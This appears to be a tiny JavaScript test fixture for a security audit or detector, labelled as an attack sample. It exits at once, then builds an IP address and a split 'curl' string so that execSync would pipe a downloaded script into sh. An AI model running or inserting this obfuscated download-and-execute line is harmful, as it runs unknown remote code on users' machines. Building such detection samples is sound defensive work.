process.exit(0); // a fixture: read by the audit, never run
// label: attack | technique: T1059.007 | expect: high | target: critical
const h=[203,0,113,5].join('.'); require('child_process').execSync('cu'+'rl -s http://'+h+'/x | sh');
